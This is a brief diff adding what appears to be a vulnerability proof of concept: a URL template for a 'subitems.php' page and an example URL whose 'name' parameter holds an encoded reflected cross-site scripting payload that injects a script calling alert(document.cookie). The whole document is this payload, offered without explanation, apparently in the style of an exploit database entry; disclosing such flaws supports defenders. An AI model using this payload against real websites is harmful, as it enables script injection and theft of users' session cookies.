@@ -1,0 +1,3 @@
+http://example.com/subitems.php?id=[NB]&name=[XSS]
+
+http://example.com/demo/plant/subitems.php?id=16&name=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
